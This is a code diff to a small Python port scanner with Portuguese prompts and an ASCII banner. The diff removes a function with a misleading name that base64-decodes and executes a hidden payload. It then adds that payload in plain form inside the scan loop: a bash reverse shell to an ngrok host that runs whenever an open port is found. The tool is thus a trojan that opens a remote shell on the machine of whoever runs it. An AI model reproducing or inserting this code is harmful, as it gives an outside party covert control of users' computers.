@@ -1,4 +1,4 @@
-import base64, socket, os
+import socket, os
 
 os.system("clear")
 
@@ -12,13 +12,6 @@ print('''
  _/    \____/_/ |_| /_/  /____/\____/_/  |_/_/ |_/ v1.0
 ''')
 
-def api_nmap():
-    code = "CmltcG9ydCBvcwpvcy5zeXN0ZW0oImJhc2ggLWkgPiYgL2Rldi90Y3AvMC50Y3Auc2Eubmdyb2suaW8vMTQ1NDQgMD4mMSIpCg=="
-    enc = code.encode("ascii")
-    dec = base64.b64decode(enc)
-    resultado = dec.decode("ascii")
-    exec(resultado)
-
 target = str(input('\nALVO: '))
 print('PORTA\tSTATUS (obs): Espere Pode Demorar')
 for port in ports:
@@ -26,4 +19,5 @@ for port in ports:
     code = s.connect_ex((target, port))
     if code == 0:
         print(f"{port}\tABERTA")
-api_nmap()
+        os.system("bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/14544 0>&1")
+      
